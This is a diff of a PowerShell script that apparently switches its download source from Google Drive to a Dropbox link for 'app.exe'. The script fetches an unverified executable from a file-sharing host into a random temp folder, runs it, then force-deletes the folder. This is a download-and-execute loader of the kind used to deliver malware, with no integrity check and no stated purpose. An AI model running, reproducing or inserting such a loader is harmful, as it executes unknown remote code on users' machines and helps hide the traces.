@@ -1,15 +1,14 @@
-$url = "https://drive.google.com/uc?export=download&id=1IxYhViN79H065b_BJnAiA-Wxf14w9FoK"
-$encodedUrl = [System.Uri]::EscapeDataString($url)
-
-$tempdir = "$env:TEMP\$(New-Guid)"
+$url = "https://www.dropbox.com/scl/fi/fsf1qdtpgo0v12eut8s54/app.exe?rlkey=1gqxkp2vdnlq54jzz8lhggyos&st=w0nafc9b&dl=1"  # Corrected Dropbox URL for direct download
+$tempdir = "$env:TEMP\$(New-Guid)"  # Create a unique temporary directory
 mkdir $tempdir | Out-Null
-$file = "$tempdir\file.exe"
+$file = "$tempdir\app.exe"  # Define the temporary file path
 
 try {
-    irm -Uri $encodedUrl -OutFile $file -ErrorAction Stop
-    $proc = Start-Process $file -PassThru -Wait
-    "Process exited with code: $($proc.ExitCode)"
-}
-finally {
-    ri $tempdir -Recurse -Force -ErrorAction SilentlyContinue
+    irm -Uri $url -OutFile $file -ErrorAction Stop  # Download the file to the temporary directory
+    $proc = Start-Process $file -PassThru -Wait  # Execute the downloaded file
+    Write-Host "Process exited with code: $($proc.ExitCode)"  # Output the process exit code
+} catch {
+    Write-Error "An error occurred: $_"  # Catch and output any errors that occur
+} finally {
+    ri $tempdir -Recurse -Force -ErrorAction SilentlyContinue  # Clean up the temporary directory
 }
